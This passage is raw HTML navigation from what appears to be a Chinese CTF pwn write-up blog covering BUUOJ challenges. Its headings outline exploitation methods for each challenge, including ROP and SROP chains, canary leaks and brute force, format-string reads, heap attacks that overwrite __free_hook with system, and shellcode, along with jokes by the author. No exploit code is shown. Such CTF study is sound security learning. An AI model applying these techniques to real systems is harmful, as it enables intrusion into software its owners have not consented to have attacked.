toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#神秘人：BUUOJ刷题之旅续作还有吗，还有木有100个EXP吗？←-←"><span class="toc_mobile_items-number">0.1.</span> <span class="toc_mobile_items-text">神秘人：BUUOJ刷题之旅续作还有吗，还有木有100个EXP吗？←_←</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#南梦：之后的刷题之旅不再公开了，但是当前这篇刷题之旅会一直公开，至于之后有木有100个EXP，那就看我明年的学习成果了（你竟然想让我进一步秃头？？？-´；ω；-100个EXP，瞧瞧这是人说的话吗？）"><span class="toc_mobile_items-number">0.2.</span> <span class="toc_mobile_items-text">南梦：之后的刷题之旅不再公开了，但是当前这篇刷题之旅会一直公开，至于之后有木有100个EXP，那就看我明年的学习成果了（你竟然想让我进一步秃头？？？ (´；ω；&#96;) 100个EXP，瞧瞧这是人说的话吗？）</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#神秘人：你天天喊着找女朋友，有女朋友了还会继续刷题吗？"><span class="toc_mobile_items-number">0.3.</span> <span class="toc_mobile_items-text">神秘人：你天天喊着找女朋友，有女朋友了还会继续刷题吗？</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#南梦：有女朋友还打什么CTF，陪女朋友不好吗？（立即打开BUUOJ开始刷题，女朋友什么的最烦了）"><span class="toc_mobile_items-number">0.4.</span> <span class="toc_mobile_items-text">南梦：有女朋友还打什么CTF，陪女朋友不好吗？（立即打开BUUOJ开始刷题，女朋友什么的最烦了）</span></a></li></ol></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#更新与维护"><span class="toc_mobile_items-number"></span> <span class="toc_mobile_items-text">更新与维护</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#后续可能会进一步更新x64和x32的解法（如果存在解的话）"><span class="toc_mobile_items-number">0.1.</span> <span class="toc_mobile_items-text">后续可能会进一步更新x64和x32的解法（如果存在解的话）</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#EXP解释之后可能会进一步完善（-就看我有没有女朋友了-°∀°-ﾉ-）"><span class="toc_mobile_items-number">0.2.</span> <span class="toc_mobile_items-text">EXP解释之后可能会进一步完善（ 就看我有没有女朋友了(°∀°)ﾉ ）</span></a></li></ol></li></ol></div></div></div><div id="body-wrap"><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true">     </i><div class="auto_open" id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-warmup-csaw-2016"><span class="toc-number">1.</span> <span class="toc-text">0x01 warmup_csaw_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-RIP覆盖一下"><span class="toc-number">2.</span> <span class="toc-text">0x02 RIP覆盖一下</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-babyfengshui-33c3-2016"><span class="toc-number">3.</span> <span class="toc-text">0x03 babyfengshui_33c3_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-babyheap-0ctf-2017"><span class="toc-number">4.</span> <span class="toc-text">0x04 babyheap_0ctf_2017</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-get-started-3dsctf-2016"><span class="toc-number">5.</span> <span class="toc-text">0x05 get_started_3dsctf_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-not-the-same-3dsctf-2016"><span class="toc-number">6.</span> <span class="toc-text">0x06 not_the_same_3dsctf_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-bugbug-codegate-2016"><span class="toc-number">7.</span> <span class="toc-text">0x07 bugbug_codegate_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-ez-pz-hackover-2016"><span class="toc-number">8.</span> <span class="toc-text">0x08 ez_pz_hackover_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09-tiny-backdoor-v1-hackover-2016"><span class="toc-number">9.</span> <span class="toc-text">0x09 tiny_backdoor_v1_hackover_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10-bbys-tu-2016"><span class="toc-number">10.</span> <span class="toc-text">0x10 bbys_tu_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x11-oneshot-tjctf-2016"><span class="toc-number">11.</span> <span class="toc-text">0x11 oneshot_tjctf_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x12-pwn1-sctf-2016"><span class="toc-number">12.</span> <span class="toc-text">0x12 pwn1_sctf_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x13-pwn2-sctf-2016"><span class="toc-number">13.</span> <span class="toc-text">0x13 pwn2_sctf_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x14-ciscn-2019-c-1"><span class="toc-number">14.</span> <span class="toc-text">0x14 ciscn_2019_c_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x15-ciscn-2019-n-1"><span class="toc-number">15.</span> <span class="toc-text">0x15 ciscn_2019_n_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x16-ciscn-2019-n-8"><span class="toc-number">16.</span> <span class="toc-text">0x16 ciscn_2019_n_8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x17-ciscn-2019-sw-7"><span class="toc-number">17.</span> <span class="toc-text">0x17 ciscn_2019_sw_7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x18-espcially-tu-2016"><span class="toc-number">18.</span> <span class="toc-text">0x18 espcially_tu_2016</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#解法一"><span class="toc-number">18.1.</span> <span class="toc-text">解法一:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解法二"><span class="toc-number">18.2.</span> <span class="toc-text">解法二:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x19-ciscn-2019-en-2"><span class="toc-number">19.</span> <span class="toc-text">0x19 ciscn_2019_en_2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x20-ciscn-s-4"><span class="toc-number">20.</span> <span class="toc-text">0x20 ciscn_s_4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x21-ciscn-2019-n-3"><span class="toc-number">21.</span> <span class="toc-text">0x21 ciscn_2019_n_3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1、利用unsorted-bin-attack知道libc地址"><span class="toc-number">22.</span> <span class="toc-text">1、利用unsorted bin attack知道libc地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2、存在UAF漏洞，然后利用fastbin-attack，实现堆块重叠，且通过利用unsorted-bin在fd、bk不够放置时，一次性将剩余堆块全部申请回来的特性，使得可以填充进system地址和sh字符串"><span class="toc-number">23.</span> <span class="toc-text">2、存在UAF漏洞，然后利用fastbin attack，实现堆块重叠，且通过利用unsorted bin在fd、bk不够放置时，一次性将剩余堆块全部申请回来的特性，使得可以填充进system地址和sh字符串</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x22-ciscn-s-8"><span class="toc-number">24.</span> <span class="toc-text">0x22 ciscn_s_8</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#导入ida后，发现是一个异或算法，然后strcpy处存在栈溢出，但是会对输入的文本进行异或0x66的处理，我们可以预先先对payload异或0x66，然后在程序对它再次异或时就会复原回有攻击性的payload"><span class="toc-number">24.1.</span> <span class="toc-text">导入ida后，发现是一个异或算法，然后strcpy处存在栈溢出，但是会对输入的文本进行异或0x66的处理，我们可以预先先对payload异或0x66，然后在程序对它再次异或时就会复原回有攻击性的payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#另外这道题，我为了图方便，且程序是静态编译，ROPgadget往往是可以生成ROPchain的，可以考虑将add-rax-1换成add-rax-3，缩短ROPchain，达成攻击。注意不换成add-rax-3会出现ROPchain被截断的情况"><span class="toc-number">24.2.</span> <span class="toc-text">另外这道题，我为了图方便，且程序是静态编译，ROPgadget往往是可以生成ROPchain的，可以考虑将add rax,1换成add rax,3，缩短ROPchain，达成攻击。注意不换成add rax,3会出现ROPchain被截断的情况</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x23-ciscn-s-3"><span class="toc-number">25.</span> <span class="toc-text">0x23 ciscn_s_3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#gadget处可以赋值rax为15，恰好为SYS-SigReturnFrame"><span class="toc-number">25.1.</span> <span class="toc-text">gadget处可以赋值rax为15，恰好为SYS_SigReturnFrame</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#那么思路如下"><span class="toc-number">25.2.</span> <span class="toc-text">那么思路如下:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1、先leak-stack地址，然后顺带的传入-bin-sh-x00字符串，通过leak-stack来定位binsh的位置，再跳回SYS-read处"><span class="toc-number">25.3.</span> <span class="toc-text">1、先leak stack地址，然后顺带的传入&#x2F;bin&#x2F;sh\x00字符串，通过leak stack来定位binsh的位置，再跳回SYS_read处</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2、赋值rax为15，跳到syscall上，成功popal-sigframe，此时sigframe的数据由我们输入的数据控制，凑成可以拿shell的形式，即可拿到shell"><span class="toc-number">25.4.</span> <span class="toc-text">2、赋值rax为15，跳到syscall上，成功popal sigframe，此时sigframe的数据由我们输入的数据控制，凑成可以拿shell的形式，即可拿到shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x24-ciscn-2019-nw-6"><span class="toc-number">26.</span> <span class="toc-text">0x24 ciscn_2019_nw_6</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#程序没有任何保护，考虑shellcode"><span class="toc-number">26.1.</span> <span class="toc-text">程序没有任何保护，考虑shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用栈内两个栈空间的指针来改写ret地址，然后顺便最后写入shellcode到bss，然后ret跳过去"><span class="toc-number">26.2.</span> <span class="toc-text">利用栈内两个栈空间的指针来改写ret地址，然后顺便最后写入shellcode到bss，然后ret跳过去</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x25-judgement-mna-2016"><span class="toc-number">27.</span> <span class="toc-text">0x25 judgement_mna_2016</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#导入IDA发现存在典型的格式化溢出漏洞，且栈内分布指向flag的指针，可以通过-xx-s来读取文本"><span class="toc-number">27.1.</span> <span class="toc-text">导入IDA发现存在典型的格式化溢出漏洞，且栈内分布指向flag的指针，可以通过$xx%s来读取文本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x26-ciscn-nw-4"><span class="toc-number">28.</span> <span class="toc-text">0x26 ciscn_nw_4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1、经过ida分析存在double-free，且show没有check，所以可以leak-heap-base和libc"><span class="toc-number">28.1.</span> <span class="toc-text">1、经过ida分析存在double free，且show没有check，所以可以leak heap_base和libc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2、通过fastbin-attack修改unsorted-bin’s-bk，在free-hook处伪造fake-chunk，然后再用double-free-fastbin-attack修改free-hook的值为system，然后释放content为-bin-sh-x00的chunk即可"><span class="toc-number">28.2.</span> <span class="toc-text">2、通过fastbin attack修改unsorted bin’s bk，在free_hook处伪造fake_chunk，然后再用double free fastbin attack修改free_hook的值为system，然后释放content为&#x2F;bin&#x2F;sh\x00的chunk即可</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#最终因为ubuntu16-04的环境问题拿不到flag，经过分析发现，是因为system函数里存在sub-rsp-0xNNN，其中NNN很大，导致后面有一个cmp指令读取到了不可读区段导致程序崩溃"><span class="toc-number">28.3.</span> <span class="toc-text">最终因为ubuntu16.04的环境问题拿不到flag，经过分析发现，是因为system函数里存在sub rsp,0xNNN，其中NNN很大，导致后面有一个cmp指令读取到了不可读区段导致程序崩溃</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x27-checker-seccon-2016"><span class="toc-number">29.</span> <span class="toc-text">0x27 checker_seccon_2016</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#首先这题开启了canary，且代码无法leak-canary，导致无法溢出"><span class="toc-number">29.1.</span> <span class="toc-text">首先这题开启了canary，且代码无法leak canary，导致无法溢出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#考虑开启了canary，且存在无限输入，但是输入中遇到-x00会截断，所以考虑使用smash来leak任意地址数据"><span class="toc-number">29.2.</span> <span class="toc-text">考虑开启了canary，且存在无限输入，但是输入中遇到\x00会截断，所以考虑使用smash来leak任意地址数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#由于遇到-x00截断或遇到换行截断并替换为-x00，我们可以考虑先输入-xc0-x10-x60-x11-x11-x11，然后再输入-xc0-x10-x60-x11-x11，直到-xc0-x10-x60"><span class="toc-number">29.3.</span> <span class="toc-text">由于遇到\x00截断或遇到换行截断并替换为\x00，我们可以考虑先输入\xc0\x10\x60\x11\x11\x11，然后再输入\xc0\x10\x60\x11\x11，直到\xc0\x10\x60</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#如何找到argv-0-，只需调试器附加运行的程序，然后找到-文件名的字符串即可，比如我这里是-checker-seccon-2016，然后将flag的地址覆盖进去即可"><span class="toc-number">29.4.</span> <span class="toc-text">如何找到argv[0]，只需调试器附加运行的程序，然后找到.&#x2F;文件名的字符串即可，比如我这里是.&#x2F;checker_seccon_2016，然后将flag的地址覆盖进去即可</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x28-ciscn-2019-ne-5"><span class="toc-number">30.</span> <span class="toc-text">0x28 ciscn_2019_ne_5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#典型的ROP题，ret2text"><span class="toc-number">30.1.</span> <span class="toc-text">典型的ROP题，ret2text</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x29-ciscn-2019-es-2"><span class="toc-number">31.</span> <span class="toc-text">0x29 ciscn_2019_es_2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x30-ciscn-2019-final-3"><span class="toc-number">32.</span> <span class="toc-text">0x30 ciscn_2019_final_3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#这题总体不难，由于tcache-attack的利用很方便，所以这题只要leak-libc就可以轻而易举拿到shell"><span class="toc-number">32.1.</span> <span class="toc-text">这题总体不难，由于tcache attack的利用很方便，所以这题只要leak libc就可以轻而易举拿到shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#简单的思路：先合并堆块，合并后的堆块大于tcache的范围，然后free掉即可出现libc，接下来就是堆块重叠malloc一个堆块到libc空间，通过gift得到libc地址，接着tcache-attack修改-free-hook拿到shell"><span class="toc-number">32.2.</span> <span class="toc-text">简单的思路：先合并堆块，合并后的堆块大于tcache的范围，然后free掉即可出现libc，接下来就是堆块重叠malloc一个堆块到libc空间，通过gift得到libc地址，接着tcache attack修改__free_hook拿到shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x31-ciscn-2019-en-3"><span class="toc-number">33.</span> <span class="toc-text">0x31 ciscn_2019_en_3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x32-ciscn-2019-c-5"><span class="toc-number">34.</span> <span class="toc-text">0x32 ciscn_2019_c_5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x33-ciscn-2019-es-4"><span class="toc-number">35.</span> <span class="toc-text">0x33 ciscn_2019_es_4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#可以考虑用unlink来获得对chunk-list控制"><span class="toc-number">35.1.</span> <span class="toc-text">可以考虑用unlink来获得对chunk_list控制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#将unlink攻击的堆块放到第32个位置，使得edit时可以改变key1和key2的值，进行解锁功能。"><span class="toc-number">35.2.</span> <span class="toc-text">将unlink攻击的堆块放到第32个位置，使得edit时可以改变key1和key2的值，进行解锁功能。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#如果完成以上两行的攻击后，接下来只需要got-leak，然后libc-leak，然后写-free-hook为system即可"><span class="toc-number">35.3.</span> <span class="toc-text">如果完成以上两行的攻击后，接下来只需要got leak，然后libc leak，然后写__free_hook为system即可</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x34-ciscn-2019-es-1"><span class="toc-number">36.</span> <span class="toc-text">0x34 ciscn_2019_es_1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#由于题目要求是2-29，但是环境是2-23，所以解法会有较大差别，但是按环境为主"><span class="toc-number">36.1.</span> <span class="toc-text">由于题目要求是2.29，但是环境是2.23，所以解法会有较大差别，但是按环境为主</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#由于只能申请12个堆块，而且一次add会申请两个堆块，对我们的堆块利用会造成干扰，所以我们需要在最后一次add的时候，同时完成unsorted-bin-attack和fastbin-attack的组合式攻击"><span class="toc-number">36.2.</span> <span class="toc-text">由于只能申请12个堆块，而且一次add会申请两个堆块，对我们的堆块利用会造成干扰，所以我们需要在最后一次add的时候，同时完成unsorted bin attack和fastbin attack的组合式攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1、leak-libc和heap-base这个攻击手法就不用多说了"><span class="toc-number">36.3.</span> <span class="toc-text">1、leak libc和heap_base这个攻击手法就不用多说了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2、先两次double-free和fastbin-attack把被攻击堆块放入bins中，然后修改unsorted-bin的bk，使得free-hook的低位地址写入0x7f开头的大数，然后在最后一次add，通过malloc-0x18-完成unsorted-bin-attack，写入大数，然后同时malloc-0x68-fastbin-attack，覆盖free-hook为system"><span class="toc-number">36.4.</span> <span class="toc-text">2、先两次double free和fastbin attack把被攻击堆块放入bins中，然后修改unsorted bin的bk，使得free_hook的低位地址写入0x7f开头的大数，然后在最后一次add，通过malloc(0x18)完成unsorted bin attack，写入大数，然后同时malloc(0x68)fastbin attack，覆盖free_hook为system</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#然后free一个内容为-bin-sh-x00的堆块即可，推荐使用double-free之后，第二次add的堆块的内容设置为-bin-sh-x00"><span class="toc-number">36.5.</span> <span class="toc-text">然后free一个内容为&#x2F;bin&#x2F;sh\x00的堆块即可，推荐使用double free之后，第二次add的堆块的内容设置为&#x2F;bin&#x2F;sh\x00</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x35-ciscn-2019-sw-6"><span class="toc-number">37.</span> <span class="toc-text">0x35 ciscn_2019_sw_6</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#简单看一下程序的功能，发现是归并排序，然后会输出逆序数"><span class="toc-number">37.1.</span> <span class="toc-text">简单看一下程序的功能，发现是归并排序，然后会输出逆序数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞在输入数组的时候，可以无限输入，所以可以考虑利用ROPgadget构造ROP链，但是开启了canary，需要leak-canary"><span class="toc-number">37.2.</span> <span class="toc-text">漏洞在输入数组的时候，可以无限输入，所以可以考虑利用ROPgadget构造ROP链，但是开启了canary，需要leak canary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#考虑到canary末尾两位为0，所以只需要爆破6位即可，想了一下程序只能输出逆序数，所以可以利用逆序数的特点进行攻击"><span class="toc-number">37.3.</span> <span class="toc-text">考虑到canary末尾两位为0，所以只需要爆破6位即可，想了一下程序只能输出逆序数，所以可以利用逆序数的特点进行攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1、输入一串有序数列，然后在canary的上方输入0，即可开始排序，由于我们输入的是一个有序数列，然后末尾为0和canary，进行排序之后输出的逆序数，可以让我们定位canary的区间"><span class="toc-number">37.4.</span> <span class="toc-text">1、输入一串有序数列，然后在canary的上方输入0，即可开始排序，由于我们输入的是一个有序数列，然后末尾为0和canary，进行排序之后输出的逆序数，可以让我们定位canary的区间</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2、有数列一开始根据0x10000000-0xFFFFFFFF，由于有299个数量（因为301是canary，300是0用于停止输入），所以一个区间大小为-0xFFFFFFFF-0x10000000-299，由于canary十分大，所以误差可以忽略不计，一次定位可以缩小三个数量级"><span class="toc-number">37.5.</span> <span class="toc-text">2、有数列一开始根据0x10000000-0xFFFFFFFF，由于有299个数量（因为301是canary，300是0用于停止输入），所以一个区间大小为(0xFFFFFFFF - 0x10000000) &#x2F; 299，由于canary十分大，所以误差可以忽略不计，一次定位可以缩小三个数量级</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3、一次定位可以确定第一位的大小，二次定位可以确定前4位的大小，第三次定位可以唯一确定一个canary或两个canary，多跑几次就好了"><span class="toc-number">37.6.</span> <span class="toc-text">3、一次定位可以确定第一位的大小，二次定位可以确定前4位的大小，第三次定位可以唯一确定一个canary或两个canary，多跑几次就好了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4、跑出canary之后，利用ROPgadget生成ROP链，然后覆盖eip即可拿到shell"><span class="toc-number">37.7.</span> <span class="toc-text">4、跑出canary之后，利用ROPgadget生成ROP链，然后覆盖eip即可拿到shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#但是buuoj的交互好像有一定的限制，导致我交互到60多次就EOF了，而拿到shell需要交互1200-，且50-的概率。buuoj两分钟重置一次环境，我觉得2分钟好像跑不完1200-次，哈哈哈，没事本地拿到shell就好了，说明思路没有错"><span class="toc-number">37.8.</span> <span class="toc-text">但是buuoj的交互好像有一定的限制，导致我交互到60多次就EOF了，而拿到shell需要交互1200+，且50%的概率。buuoj两分钟重置一次环境，我觉得2分钟好像跑不完1200+次，哈哈哈，没事本地拿到shell就好了，说明思路没有错</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#这里介绍一个jly大师傅的解法，scanf-“-ud”-，如果输入带符号的数，则不会改变欲写入地址的数据，就可以越过canary直接写ropchain，这不得不膜一下jly师傅"><span class="toc-number">37.9.</span> <span class="toc-text">这里介绍一个jly大师傅的解法，scanf(“%ud”)，如果输入带符号的数，则不会改变欲写入地址的数据，就可以越过canary直接写ropchain，这不得不膜一下jly师傅</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x36-ping-gnop-hackover-2016"><span class="toc-number">38.</span> <span class="toc-text">0x36 ping_gnop_hackover_2016</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#我将这题称为ROPgadget-–ropchain人工版"><span class="toc-number">38.1.</span> <span class="toc-text">我将这题称为ROPgadget –ropchain人工版</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目中存在过滤字符，所以要一个一个尝试gadget，然后再利用可用的gadget构造ROP链，最后通过int-0x80拿到shell"><span class="toc-number">38.2.</span> <span class="toc-text">题目中存在过滤字符，所以要一个一个尝试gadget，然后再利用可用的gadget构造ROP链，最后通过int 0x80拿到shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x37-warmup"><span class="toc-number">39.</span> <span class="toc-text">0x37 warmup</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#这题要配好各个寄存器参数，然后利用read将读入字符数写入eax，从而将函数序列号变成execve的序列号，然后再确保寄存器内的指针都是正确的，即可拿到shell"><span class="toc-number">39.1.</span> <span class="toc-text">这题要配好各个寄存器参数，然后利用read将读入字符数写入eax，从而将函数序列号变成execve的序列号，然后再确保寄存器内的指针都是正确的，即可拿到shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x38-fixedpoint-plaid-2016"><span class="toc-number">40.</span> <span class="toc-text">0x38 fixedpoint_plaid_2016</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#这题就是典型的shellcode，找数字吧小伙子"><span class="toc-number">40.1.</span> <span class="toc-text">这题就是典型的shellcode，找数字吧小伙子~~</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x39-ciscn-2019-final-2"><span class="toc-number">41.</span> <span class="toc-text">0x39 ciscn_2019_final_2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#典型的UAF和tcache-attack，但是dup2函数需要我们将stdin的fileno替换为666，然后再输入一次数据（即功能4退出里的scanf），就可以输出flag"><span class="toc-number">41.1.</span> <span class="toc-text">典型的UAF和tcache attack，但是dup2函数需要我们将stdin的fileno替换为666，然后再输入一次数据（即功能4退出里的scanf），就可以输出flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x40-强网杯2019-拟态-STKOF"><span class="toc-number">42.</span> <span class="toc-text">0x40 强网杯2019 拟态 STKOF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x41-ciscn-2019-ne-3"><span class="toc-number">43.</span> <span class="toc-text">0x41 ciscn_2019_ne_3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x42-bcloud-bctf-2016"><span class="toc-number">44.</span> <span class="toc-text">0x42 bcloud_bctf_2016</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#典型的house-of-force"><span class="toc-number">44.1.</span> <span class="toc-text">典型的house of force</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x43-web-of-sci-volga-2016"><span class="toc-number">45.</span> <span class="toc-text">0x43 web_of_sci_volga_2016</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#leak-canary，然后普通的ROP"><span class="toc-number">45.1.</span> <span class="toc-text">leak canary，然后普通的ROP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x44-ciscn-2019-sw-1"><span class="toc-number">46.</span> <span class="toc-text">0x44 ciscn_2019_sw_1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#printf花式溢出漏洞，无限循环"><span class="toc-number">46.1.</span> <span class="toc-text">printf花式溢出漏洞，无限循环</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x45-中关村2019-one-string"><span class="toc-number">47.</span> <span class="toc-text">0x45 [中关村2019]one_string</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#orw"><span class="toc-number">47.1.</span> <span class="toc-text">orw</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x46-bjdctf-2020-babyrop"><span class="toc-number">48.</span> <span class="toc-text">0x46 bjdctf_2020_babyrop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x47-bamboobox"><span class="toc-number">49.</span> <span class="toc-text">0x47 bamboobox</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x48-poke-naxtos-sthack-2016"><span class="toc-number">50.</span> <span class="toc-text">0x48 poke_naxtos_sthack_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x49-ciscn-2019-final-4"><span class="toc-number">51.</span> <span class="toc-text">0x49 ciscn_2019_final_4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#和ciscn-sw-10类似"><span class="toc-number">51.1.</span> <span class="toc-text">和ciscn_sw_10类似</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x50-ciscn-2019-s-6"><span class="toc-number">52.</span> <span class="toc-text">0x50 ciscn_2019_s_6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x51-ciscn-nw-4"><span class="toc-number">53.</span> <span class="toc-text">0x51 ciscn_nw_4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x52-第五空间2019-决赛-PWN5"><span class="toc-number">54.</span> <span class="toc-text">0x52 [第五空间2019 决赛]PWN5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x53-ZJCTF-2019-EasyHeap"><span class="toc-number">55.</span> <span class="toc-text">0x53 [ZJCTF 2019]EasyHeap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x54-ZJCTF-2019-login"><span class="toc-number">56.</span> <span class="toc-text">0x54 [ZJCTF 2019]login</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x55-ciscn-2019-n-5"><span class="toc-number">57.</span> <span class="toc-text">0x55 ciscn_2019_n_5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x56-ciscn-2019-s-1"><span class="toc-number">58.</span> <span class="toc-text">0x56 ciscn_2019_s_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x57-fl0ppy-codegate-2016"><span class="toc-number">59.</span> <span class="toc-text">0x57 fl0ppy_codegate_2016</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#经过黑盒测试，发现strcpy的漏洞，然后多次黑盒测试发现leak了libc和stack-addr，然后通过strcpy实现栈溢出，然后在main函数执行完毕时，进行栈迁移，迁移到rop处，从而执行system-“-bin-sh-x00”"><span 